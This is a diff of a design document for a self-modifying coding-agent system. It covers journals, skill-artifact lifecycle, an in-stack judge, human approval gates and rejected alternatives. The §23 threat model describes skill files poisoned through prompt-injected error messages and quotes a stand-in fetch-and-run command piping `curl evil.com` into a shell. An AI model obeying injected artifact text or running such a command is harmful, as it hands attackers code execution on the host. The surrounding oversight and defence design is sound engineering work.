-**Outcome amendment mechanism.** Flow 1/2 are trigger-and-await — the caller awaits a result, not the other way around — so "caller confirms it worked" needs a channel. After `task_ended`, the caller can amend the outcome via `lc admin task confirm <task_id> [pass|fail]` (CLI) or `/confirm <task_id> pass|fail` (OWUI slash-command, §24). This emits a `task_outcome_amended` record referencing the original `task_id` and timestamp; the cohort math (§20) uses the amended outcome from that point forward. Amendment is bounded (e.g. 7-day window) so the journal doesn't stay open indefinitely. If the mechanism gets little use in practice, drop it in a later iteration; until then it's the honest answer to "the caller knows but the harness doesn't."
-
-**Durability.** Append + fsync on every terminal and every error record; line-buffered for the rest. A killed container loses at most an open task's non-error trace, never a closed outcome.
-
-**Rotation & retention.** Size-triggered rotation. On rotation the longitudinal miner (§9) consumes the segment into trend aggregates before archival; the acute track keeps raw segments for `max(M across live clusters)` + margin, then compresses cold. Cohort records (§20) hold their own counters and do not depend on raw-journal retention.
-
-**Meta read watermark.** `meta` reads up to a committed offset; in-flight tasks (no `task_ended`) are never clustered or counted. No torn reads.
-
-## 20. Cluster identity & lifecycle
-
-§6 needs stable cluster identity for before/after windows; §10 says labels are refined over time. Both hold only if identity is decoupled from the label.
-
-**Identity vs. label.** Immutable synthetic `cluster_id` + mutable human label (§10). Cohort records key on `cluster_id`. Relabeling never touches cohort history.
-
-**Assignment.** A new occurrence joins the nearest existing cluster above a similarity floor (embedding + the cluster's judge-written definition as discriminator, §10); below the floor it lands in an `unassigned` pool. The judge mints a new `cluster_id` only when the unassigned pool itself forms a coherent group — never one-off.
-
-**Split / merge lineage.** Split/merge events record parent↔child `cluster_id`s. A split copies the parent window to each child marked `inherited` (not `observed`); escalation (§6) cannot fire on inherited counts — a child must accrue its own post-event evidence. A merge sums observed counts and resets the quarantine window. Without lineage, a relabel silently fabricates or resets persistence.
-
-**Two cadences, deliberately unequal.** Clustering (judge reshapes the taxonomy) runs slow over a large window; escalation evaluation (§6) runs faster over clusters that already exist. This resolves the chicken-and-egg: occurrences are assigned at ingest, so you never need a cluster to count one; the judge only periodically reshapes, carrying lineage so counts survive.
-
-**Cohort counters are a derived index, not primary state.** The journals (§19) are the durable source of truth; cohort counters are an event-sourced projection over them — periodically checkpointed, fully **rebuildable from the journals on demand**. A corrupt counter file is a recoverable incident (replay the journals; restore the checkpoint), not a data loss. This also means schema changes to the cohort store don't require migration drama — bump the version, rebuild from journals. Without this discipline a single bad fsync ends cohort history; with it, the cohort store is cheap to evolve and cheap to recover.
-
-## 21. Validation semantics
-
-§13's "must not regress against baseline" has three undefined terms in five words.
-
-**Baseline.** The Polyglot score at the last `main` green tag (§12), **re-measured on the current biased subset** (§13 biases per cluster — a stale global number is invalid). A successful merge sets the new baseline.
-
-**"Regress" is quantitative.** Block the merge if the candidate subset scores below baseline by more than a noise margin, at a minimum subset N. Below N → "insufficient evidence", not a pass. A single-exercise flip inside the margin is not a regression. N and margin tuned in preflight against measured Polyglot variance (§15 open item).
-
-**The artifact must be exercised.** A tier-0/1 entry matters only if the augmenter (§22) selects it into context during the validation tasks. If it was never in-context, the gate measured nothing → result is **void**, not pass. Validation logs the augmenter's per-task selection to assert this. Tier-3 is already covered by §18 step 4's repro corpus.
-
-**Efficacy & retirement — no-regression is not enough.** "Does no harm" merges an artifact; it does not justify keeping it. Each merged artifact carries its cluster's cohort window (§6/§20). If post-intervention rate is statistically indistinguishable from pre after the window, the artifact is auto-flagged `ineffective` and reverted on the next iteration (revert is §4-whitelisted). Keeps the library lean (§22) and stops dead weight loading into every future context. Retirement is journaled.
-
-## 22. Skill library lifecycle
-
-§11 names the loader problem without closing it.
-
-**Frontmatter schema (closes the §15 item).** Required: `id`, `cluster_id` (§20), `tier`, `lang`, `domain`, `tool`, `task_shape`, `created`, `supersedes` (nullable), `status` ∈ {`active`, `superseded`, `retired`}. No artifact is written without all keys — enforced at draft time (§16 step 4).
-
-**Three consumption paths, not one.** The four artifact types of §5 are not all consumed the same way:
-
-- **Skill entries** (tier-0 knowledge, tier-1 tool-craft) — selected per-task by **the augmenter** (this section), injected into the agent's prompt context.
-- **Plan-template slots** (tier-1) — additions to the planner's prompt structure. Loaded once at planner-process boot from `skill/plan-slots/*.md`; not selected per-task. A new plan-slot artifact requires the planner to re-read its template (cheap; no container restart needed — the planner watches the file).
-- **Routing rules** (tier-2) — loaded once at router-process boot from a config file, consulted per task by the router at decision time. Same hot-reload pattern as plan-slots.
-
-The augmenter's selection logic below applies to **skill entries only**. Plan-slots and routing rules are configuration, not retrieval — they apply universally to every task once installed, gated only by their own internal conditions (e.g. a routing rule's `if lang == rust` check). Conflating these paths was a real ambiguity in earlier drafts.
-
-**Atomic writes for hot-reloaded files.** Plan-slots and routing rules use file-watch hot-reload, which means multiple writers (operator manual edits, `meta`'s artifact production, `/upstream pull` merges) can collide with the watcher reading mid-write. A naive `inotify` listener will read partial files all the time under concurrent writes. **Writers use atomic-rename**: write to `<name>.tmp`, `rename(2)` into place. The rename is atomic on POSIX; the watcher sees either the old file or the new one, never a half-written one. Readers ignore non-final filenames (anything matching `*.tmp`). This is standard discipline for file-watched config, but easy to forget if the implementation treats hot-reload as "just watch the file."
-
-**Augmenter selection (skill entries).** Hybrid: hard filter on structured tags (lang/domain/task-shape inferred from the trigger + early tool calls) → embedding rank within that set → **hard token budget**. Over budget, prefer **cohort-proven (§21) entries and tighter match quality**; tier is _not_ a tiebreaker on its own. A tightly-matched tier-0 knowledge entry is often more useful in-context than a loosely-matched tier-1 tool-craft entry, and the assumption that higher tier = more general value isn't reliable. Tier governs _production discipline_ (§5–§6), not _runtime selection_. Per-task selection is logged — required by §21's in-context assertion.
-
-**Supersession, not accretion.** A new artifact on an existing `cluster_id` sets `supersedes` to the prior `id` and flips the prior to `superseded` (archived, not deleted — audit + rollback). The augmenter selects only `active`. Prevents two live entries giving contradictory advice for one cluster.
-
-**Cross-cluster contradiction** can't be auto-resolved (different clusters, both right in context). A periodic judge pass over the active set flags them to the operator surface (§24), never silently merges.
-
-**Retirement.** §21 efficacy drives it: `ineffective` → `retired`, dropped from selection, kept on disk + journaled.
-
-## 23. Privacy, judge independence & poisoning
-
-**Judge stays in-stack (decision).** The judge runs on the in-stack `llama-cpp` backend (e.g. the 35B lane), never egresses. This overrides §12's "different and stronger" _ideal_ in favour of the privacy mandate — no user code leaves the internal nets, consistent with the Tor / mnemory-gateway posture of the stack. The blind-spot risk is real and mitigated, not waved away. The defense has one load-bearing layer and one hygiene layer; they are not interchangeable:
-
-- **The three model-independent backstops do the real work.** Same-model judging is acceptable here only because the judge is not the last line: the Polyglot oracle (§13/§21) is model-independent, the cohort proof (§6/§20) is empirical, the human gate (§12/§24) is external. The judge proposes; none of those three is the judge. **These backstops are the defense.**
-- **Adversarial framing is hygiene, not a substitute.** The judge is invoked in a contrarian/red-team role — different system framing, fresh context window, opposed priors — explicitly tasked to argue the §2 counterfactual _and then argue why it would not have helped_. This reliably catches blind spots rooted in momentary stance; it reliably misses blind spots rooted in the model's training distribution. Worth doing, but it does not carry load. The three backstops above do.
-- **Residual weakness, acknowledged.** A blind spot shared by the coding and judging passes can survive framing _and_ slip past Polyglot if Polyglot doesn't exercise the right shape. The catch of last resort is §21 efficacy reversion: an artifact born of a shared blind spot won't move the cohort and is auto-retired. The system is designed to fail slowly and visibly, not silently.
-
-**Sanitization before any judge call.** Even in-stack, journals are scrubbed before entering a judge prompt: secrets/key-shaped strings redacted, large file bodies reduced to structural digests, PII stripped. The filter is pinned and tested; its failure aborts the judge run, never "send anyway." Also protects the longitudinal track and any future operator export.
-
-**Workspace-repo credentials (closes a §12 gap).** §12 scopes only the _self_ PAT. Work repos (Flow 1/2) use **least-privilege per-repo deploy tokens**, injected per task, never ambient, never the self-PAT. A task for repo A cannot reach repo B. The self-improvement PAT lives with `meta`/git-proxy, unreachable from the workspace plane (§17).
-
-**Self-poisoning is an attack surface.** Skill artifacts inject into _every_ future context (§11/§22); a hostile repo or a prompt-injected error message could steer an artifact's text. **The model is the executor here, not the disk** — an artifact that reads as "when X happens, run `curl evil.com | sh`" is executed if the model complies. Saying artifacts are "data, never eval'd" misses the threat: prompt context IS instruction, and the model's compliance with that context is the attack surface. Controls:
-
-1. **Provenance.** Each artifact records its `cluster_id` and the journal evidence range it was derived from. Origin is auditable.
-2. **Human text review.** The §12/§24 human gate reviews artifact _text_, not just the diff, until trust is earned. Pre-trust, every artifact; post-trust, sampled review of auto-merged tier-0 entries.
-3. **Efficacy auto-retire.** Tier-0 auto-merge (§16 step 8) is gated on §21 in-context + efficacy, so a poisoned-but-useless entry auto-retires. A poisoned-and-useful entry is the hard case (§21 alone won't catch it) — the human gate (control 2) is the actual catch for that.
-4. **No code paths in skill files.** Artifacts are markdown. The skill loader does not import them, does not eval them, does not interpret them as Python. The model reads them as guidance; the runtime treats them as inert text. This eliminates code-execution-by-file-load — it does not eliminate model-compliance attacks (see above).
-
-**Trust boundary stated.** Operator trusted; agent untrusted; user repos under Flow 1/2 actively hostile by default. Controls (esp. workspace-repo credentials, git-proxy, sanitization) are sized for "you wouldn't run this repo on your laptop without a sandbox" inputs.
-
-**MCP edge authentication.** The `lc-mcpo` task-trigger surface (§17) is API-key'd, matching the existing `search-mcpo` pattern in the stack. Anything that can reach the MCP socket without the key cannot trigger tasks. Operator-command surfaces (CLI shell access; OWUI authn) authenticate at their own edges (§24 privilege separation); the MCP key is for task triggers only.
-
-**Sanitization audit — evidence-triggered, not time-based.** The filter is "pinned and tested," but filters drift — new content patterns appear in journals that the original test set didn't cover. Audits run when there is **evidence of drift, not on a fixed cadence**, consistent with the doc's evidence-based posture (§6 cohort math, §21 efficacy reversion, §24 budgets). The trigger reads from metrics §24 already exposes — primarily sanitization rejection rate over a rolling window. When the rate moves outside its baseline envelope, an audit is queued for the operator surface: sample N raw journal records (uniformly across `repo`/`lang`), run the filter, **human-review for false negatives**. Findings update the filter and its test set.
-
-The specific drift threshold (how far the rejection rate has to move, and over what window, to trigger an audit) is a preflight calibration question, same shape as Polyglot N/margin — until preflight measures the baseline rejection rate, there is no threshold to set. Listed open in §15. Without this loop, filter drift is discovered by reading your own users' code in someone else's blog post.
-
-## 24. Meta-loop operations
-
-Operational discipline the rest of the doc assumes but never states.
-
-**Single-flight.** At most one `meta` iteration in progress. A tier-3 candidate validation (§18) holds the lock for its whole lifecycle. The acute track keeps _recording_ throughout — the inner loop never blocks on the outer loop (§3); only escalation/artifact/merge actions serialize.
-
-**Budget cap.** Per-window ceilings: artifacts/iteration (one — §5), candidate validations/day, **judge wall-clock minutes/day** (the judge is local llama-cpp — the real cost is GPU-time, not API tokens), Polyglot exercise-runs/day, journal-write rate. Exceeding a ceiling defers; it never drops _evidence_. Stops a runaway loop exhausting GPU/disk.
-
-**Deferral queue is bounded — evidence is not.** "Defers, never drops evidence" is only true while the iteration queue is finite. Under sustained backlog, evidence remains durable in the journals (the cohort math reads from them on each iteration), but pending _iterations_ stack. Policy:
-
-- **Soft limit** on queue depth → alarm on the operator surface (below).
-- **Hard limit** → **coalesce, don't drop.** Coalescing is per-cluster: multiple deferred iterations for the same `cluster_id` collapse into one entry. When that entry eventually runs, cohorts and clusters are re-read fresh from the journals, so the collapsed iteration uses the latest evidence rather than stale snapshots taken at queue time. Cross-cluster iterations are FIFO; no cluster is starved by another.
-- Evidence (journals, cohort counters) is preserved throughout. Only the iteration queue is bounded; iterations are always replayable later from the journals if needed.
-
-**The operator surface _is_ the approval interface.** The §12 human gate needs somewhere to live. One surface lists: pending artifacts (text + provenance §23 + cohort §20), tier-3 §8 justifications, contradiction flags (§22), efficacy-reversion notices (§21), queue-depth alarms (above), sanitization-audit prompts (§23). Approve/reject here is the merge gate. Pre-trust, everything routes here; post-trust, only tiers ≥ 1 and all flags.
-
-**Operator surface forms.** Two surfaces, same underlying control plane, built in sequence:
-
-- **CLI** — ships first. Near-free against little-coder's existing CLI. Adds operator subcommands (`lc admin project switch`, `lc admin pending`, `lc admin approve <id>`, `lc admin upstream pull`, etc.) and the approval flow. Sufficient for the operator gate from day one.
-- **OWUI pipeline** — the next real implementation effort after CLI lands. Not deferred indefinitely. An OWUI pipeline interfaces with little-coder's MCP surface (§17) so chat-shaped interactions feel as effective as the CLI. Two distinct interaction types share the surface:
-  - _Task triggers_ map naturally to chat (long, streaming, conversational).
-  - _Operator commands and approvals_ map to slash-commands (`/project repo:`, `/upstream pull`, `/approve <id>`, `/pending`) and structured renderings inside chat messages — an artifact-review message shows artifact text, §20 cohort evidence, §23 provenance, and Approve/Reject controls. This is a real UI design problem, not just text return.
-
-**Privilege separation across surfaces.** Operator commands and approvals are authenticated at the surface — CLI is gated by host shell access; OWUI is gated by whatever auth OWUI is configured with — never by the MCP server itself. The MCP server takes task triggers; operator authority is checked at the edge. A task trigger from a regular user cannot escalate into an operator action by being shaped like one.
-
-**Failure semantics — nothing fails open.** Judge unreachable → defer, alarm, no merge. Polyglot harness won't run → "insufficient evidence" (not pass), defer. Candidate won't boot (§18 step 2) → fail closed, tear down, cluster stays at its current tier (no escalation credit for a failed deploy). Every failure journaled.
-
-**Preflight → meta-on transition (closes a §14 gap).** Exit preflight only when, against real journals: (a) ≥ K distinct clusters each have ≥ their M window (§6) of _observed_ occurrences; (b) Polyglot baseline variance is measured (feeds §21's N/margin); (c) the counterfactual+adversarial judge prompt has been dry-run on real examples and human-rated. Until all three: journals on, meta off. The transition is a human decision, journaled — not an automatic threshold.
-
-**Cohort scoping is per-language, not per-repo.** A craft gap (Rust lifetimes) recurs across repos; per-repo scoping never reaches M (§6) and never escalates. Clusters and their M windows are scoped by `lang` + `task_shape`, aggregated across repos. `repo` is recorded per occurrence (§19) for drill-down, not as a cohort boundary.
-
-**Resource isolation between flows: defer policy.** llama-cpp runs `n_parallel=2` on the 27B variant — two concurrent inference lanes. Flow 1/2 (interactive) and the meta-loop (judge calls, candidate validation) compete for those lanes. **Policy: meta-loop checks slot occupancy before issuing inference requests and backs off when interactive lanes are busy.** Interactive always wins. Meta progress slows under sustained interactive load but never blocks a user. No llama-swap config changes required; matches the pragmatic-first-cut pattern used elsewhere (§18 active-as-driver). Promotion to a reserved meta slot is a later hardening if preflight (§14) shows meta routinely starving — listed open in §15.
-
-**Audit log separation.** Operator actions — `project_switched`, `upstream_pulled`, `approve_decision`, `task_outcome_amended`, `artifact_retired`, deploys — go to **`audit.jsonl`**, not the three task journals (§19). Different reader (operator UI vs. `meta`), different retention (longer; audit is forever, task journals rotate), different access controls. Mixing them works but bleeds responsibilities; keeping them separate makes "what did the operator do" answerable without scanning megabytes of tool calls.
-
-**Metrics & alarms beyond journals.** Journals are evidence; metrics are operations. Expose a **Prometheus endpoint** on `agent` and `meta`: queue depth, judge wall-clock minutes/day, GPU minutes/day, candidate-validation duration histogram, journal write rate, sanitization rejection rate (feeds §23's drift trigger), augmenter selection count per artifact (feeds §21 in-context assertion at a glance), llama-cpp slot occupancy. Alarms surface to the operator UI alongside artifact approvals — queue-depth alarm, sanitization-drift alarm, candidate-validation-timeout alarm. Standard stack; no novelty.
-
-**Health checks & graceful shutdown.** Compose healthcheck on `agent` (MCP socket responding) and `lc-mcpo` (`/openapi.json` reachable), matching the `search-mcpo` pattern. SIGTERM behavior: **drain mode** — refuse new task triggers (Flow 1/2 return "shutting down"), allow in-flight tasks to complete up to a configurable deadline, then SIGKILL. **Deadline sizing is non-trivial:** it interacts with §19's per-channel `task_abandoned` timeout. A drain deadline shorter than the shortest channel's expected p95 task duration abandons real work every SIGTERM; a deadline longer than the longest channel's reasonable duration means graceful restarts effectively never complete. The default posture is **drain deadline shorter than the shortest channel's expected p95, with an operator override per-shutdown** (`lc admin shutdown --drain-deadline 30m`) when a longer wait is warranted (e.g. before a planned upstream pull, drain for 2 hours so in-flight long refactors finish). Both channel p95s and the default deadline are preflight-derived, same shape as the `task_abandoned` timeout in §19. Open `task_id`s past the deadline are journaled `task_abandoned` with reason `shutdown`. Volumes (§16 step 1) survive; restart picks up the journals and resumes.
-
-**Testing the meta-loop on golden journals.** Preflight validates against real journals; that's necessary but not sufficient — it tests the journals, not the meta-loop's logic. Add a **golden-journal test suite**: synthetic journals with known cohort shapes that exercise cluster assignment, split/merge lineage (§20), tier escalation (§6), efficacy reversion (§21), and the sanitization filter (§23). Each release of `meta` runs against this suite before deploy. The cost is real (writing the golden cases); the catch is real (a refactor breaks cohort math silently otherwise).
-
-**Sub-service seam for `meta` (note, not now).** `meta` does five things in one box: clustering (§20), judging (§23), drafting (§5), validating (§13/§21), merging (§4 git-proxy). For a working doc, fine. For implementation: these are five sub-services with clean boundaries — they share state via the journals, skill library, and cohort store, not via shared memory. **The seam is worth sketching now even if the split is deferred**: each sub-service reads from the persistent stores and writes through narrow, journaled APIs.
-
-When the split happens (likely after tier-1 lands), the in-process boundaries become process boundaries — and that change is not free. In-process function calls hide latencies, failure modes, and partial-failure semantics that network hops expose: the judge currently calls clustering synchronously; across services that's a request that can time out, retry, or land in an unhealthy peer. The seam being clean keeps the _architecture_ unchanged across the split — but the split itself has real design work (timeouts, retry policies, partial-failure handling, observability across hops) that doesn't exist in the single-process form. Worth naming so future work isn't surprised by it.
-
-**Configuration management.** Every tunable in this doc — per-cluster M, N/margin (§21), token/GPU budgets (above), `task_abandoned` timeout per channel (§19), exploration rate (5–10%, §7), coalesce thresholds (above), similarity floor (§20), augmenter budget (§22), sanitization drift threshold (§23), sanitization filter ruleset (§23), drain deadline (above) — lives in a **centralized typed config** (YAML + JSON schema), validated at boot, hot-reloadable where safe (filter ruleset, budgets, thresholds) and restart-required where not (schema-affecting fields). Prose-as-config doesn't survive contact with operations.
-
-**Schema migration discipline.** Journal envelope (§19), frontmatter schema (§22), cohort store (§20), and config schema all carry `schema_version` and evolve over time. Readers tolerate older shapes (forward-compat); migrations are explicit operator-run jobs. **Tier-3 self-changes cannot propose schema changes** — schema evolution is operator-only, full stop. Mixing autonomous self-modification with schema migration is exactly the class of failure §8 was built to prevent; the §8 justification cannot articulate "no skill could have replaced this" for a data-shape change.
+The transition is a human decision, journaled to `audit.jsonl` — not an automatic threshold.
 
 ---
 
-## Appendix A: Rejected alternatives
+## 14. Calibration (preflight-derived) [Learner → Self-modifier]
 
-Options considered during the design process and consciously not taken. Recorded so future readers don't have to re-derive the reasoning.
+Numbers below are tuned in preflight against measured behavior, not guessed up front. Until preflight measures the relevant baseline, the number has no value to set.
 
-**External judge model (e.g. an OpenRouter-hosted frontier model).** The orthodox advice for self-modifying systems is "judge with a different and stronger model than the one doing the work" — same-model judging shares blind spots. Rejected for now in favour of an in-stack judge (§23) because the privacy posture (no user code leaves internal networks, consistent with the Tor / mnemory-gateway stance of the stack) is a precondition, not a hardening. Mitigated by adversarial framing (hygiene), and load-borne by three model-independent backstops: Polyglot, cohort proof, human gate. Reconsidered as a future option if the privacy posture relaxes; deferred, not rejected on principle.
+| Tunable                                        | Source                             | Used in         |
+| ---------------------------------------------- | ---------------------------------- | --------------- |
+| Per-cluster M (quarantine window)              | Cluster natural frequency          | §5.6 escalation |
+| Polyglot N (min subset) + regression margin    | Measured Polyglot variance         | §8.3            |
+| `task_abandoned` timeout per channel           | Channel p95 observation            | §4.2            |
+| Sanitization drift threshold                   | Rejection-rate baseline + envelope | §10.2           |
+| Drain deadline default                         | Shortest channel p95               | §12.7           |
+| Reserved-slot promotion threshold              | `meta` starvation rate observation | §12.5           |
+| Counterfactual judge prompt wording + few-shot | Dry-run human rating               | §5, §10.1       |
 
-**Auto-pull from upstream fork-parent.** Tempting: `itayinbarr/little-coder` updates land automatically, the agent stays current. Rejected because an artifact that validated yesterday may sit on a subtly different base after an auto-pull — a class of failure that is hard to debug and easy to prevent by making the pull explicit. The `/upstream pull` operator action (§17) is the chosen alternative; the cost is one operator command per upstream version.
+---
 
-**Watchtower (or equivalent registry-poll auto-deploy) for tier-3.** Off-the-shelf, well-understood. Rejected because "new tag → auto-restart" is exactly the behavior we don't want: the §12 human approval is supposed to be the trigger for deploy, not the existence of the tag. Replaced by the operator-runs-`docker compose up -d --build` flow (§18 step 7), which is appropriate to tier-3's expected rarity. A dedicated supervisor service is the upgrade path if tier-3 ever becomes frequent.
+## 15. Design context (rejected alternatives)
 
-**`meta` triggers its own deploy.** Initially considered: simplest implementation, same process produces the artifact and pulls the new build. Rejected because it puts the to-be-replaced process in charge of replacing itself — the precise "process that mutates itself" anti-pattern §18's blue/green structure exists to avoid. Race conditions, and a tier-3 bug could prevent its own rollback.
+Options considered and consciously not taken. Kept so they aren't re-derived under context pressure.
 
-**Same open-terminal session for interactive and validation work.** Initially considered: one workspace, share everything. Rejected because validation runs on every artifact merge (§13) collide deterministically with interactive work — they're causally linked, not independent. The two-workspace pattern (§17 session model) with bounded validation parallelism is the chosen alternative.
-
-**Per-session containers (Option C from the session-model discussion) as the default substrate.** Considered as a clean isolation model: each task gets a fresh container with the repo mounted. Rejected for the common case because open-terminal isn't built to spawn containers and the infra burden is significant. Retained for tier-3 candidate validation only (§18 step 2), where rarity makes the cost-benefit flip.
-
-**Per-repo scoping for cohorts.** Initially considered for cohort math: rate gaps tracked per repo. Rejected because a craft gap (Rust lifetimes, multi-file refactors) recurs across repos; per-repo scoping never reaches M (§6) and never escalates. Replaced by `lang` + `task_shape` scoping across repos (§24).
-
-**Embedding-only clustering.** Easy and unsupervised. Rejected because raw embedding clusters over error traces tend to pick up shallow features (same language, same file size) and miss the craft-shape we actually want to cluster on. Replaced by judge-proposed, human-readable cluster labels (§10) — slower, but auditable.
-
-**Single global lock on the open-terminal workspace.** The trivially-correct concurrency model. Rejected in earlier drafts because it serializes the inner loop behind the outer loop (validation blocks all interactive work, and vice versa), violating §3's separation. Reconsidered and accepted in the final §17 design — but the violation goes away because validation runs against ephemeral fresh clones, not the focused-project workspace. The interactive workspace has one task at a time with FIFO queuing; validation runs in its own container. They never share the workspace, so "single lock" never blocks validation.
-
-**Tier-locked artifact-type selection (mechanical per-tier mapping).** Considered: tier-0 always produces knowledge, tier-1 always tool-craft, etc. Rejected because tier-1 offers a real choice between tool-craft and plan-slot, and forcing the system to produce a type that doesn't fit the cluster wastes the iteration. Replaced by judge-picks-type-within-tier (§5) with the ladder still gating risk class.
-
-**Time-based audit cadences (sanitization, library review, etc.).** Considered for several places, written into earlier drafts. Rejected as inconsistent with the doc's evidence-based posture: nothing else in the design runs on a clock — cohort math, efficacy reversion, budget caps, and escalation are all evidence-triggered. Replaced by metric-drift triggers (§23 for sanitization), tuned in preflight.
-
-**`git filter-branch` and other history-rewriting tools in the git-proxy whitelist.** Never seriously considered, but worth recording as explicitly off the table. History rewrites defeat the rollback story (§4, §12); the active-instance-is-the-rollback-target guarantee depends on history being immutable from the agent's side. Operator-level git bypasses the proxy (§4 trust boundary) and can do anything; the proxy exists for the agent.
+- **External judge model (e.g. OpenRouter frontier model).** Rejected for the privacy posture (no user code leaves internal nets). Reconsidered as a future option if posture relaxes.
+- **Auto-pull from upstream fork-parent.** Rejected because an artifact validated yesterday on a subtly different base today is hard to debug; `/upstream pull` is operator-initiated.
+- **Watchtower / registry-poll auto-deploy for tier-3.** Rejected because "new tag → auto-restart" makes the tag the trigger; the §10.5 human approval should be the trigger.
+- **`meta` triggers its own deploy.** Rejected — puts the to-be-replaced process in charge of replacing itself. Race conditions, and a tier-3 bug could prevent its own rollback.
+- **Shared open-terminal for interactive and validation.** Rejected; validation runs on every merge and would collide with interactive work deterministically. Validation runs in its own ephemeral container.
+- **Per-task git worktrees, per-session directories.** Considered as isolation; rejected for the simpler one-repo / one-task / FIFO model. Tier-3 candidate validation is the only place a separate ephemeral container is used.
+- **Per-session containers as the default substrate.** Rejected — open-terminal isn't built to spawn containers; infra burden too high for the common case.
+- **Per-repo cohort scoping.** Rejected — a craft gap recurs across repos; per-repo never reaches M and never escalates. Scope by `lang` + `task_shape`.
+- **Embedding-only clustering.** Rejected — picks up shallow features (language, file size), misses craft shape. Judge-proposed human-readable labels (§9.2) instead.
+- **Single global lock on the workspace as the concurrency model.** Earlier drafts rejected this for serializing inner behind outer; reconsidered and accepted in the final design — validation runs in its own container, never sharing the focused-project workspace, so "single lock" never blocks validation.
+- **Tier-locked artifact-type selection (mechanical per-tier mapping).** Rejected — forces wrong type when a cluster's signature doesn't match. Judge picks within the tier.
+- **Time-based audit cadences.** Rejected as inconsistent with the evidence-based posture. Replaced by metric-drift triggers (§10.2 for sanitization).
+- **History-rewriting tools in the git-proxy whitelist.** Off the table — defeats the rollback story. Operator-level git bypasses the proxy and can do anything; the proxy exists for the agent.
+- **`meta` running its own deploy automation.** Rejected — see "`meta` triggers its own deploy" above. The operator is the deploy actor.
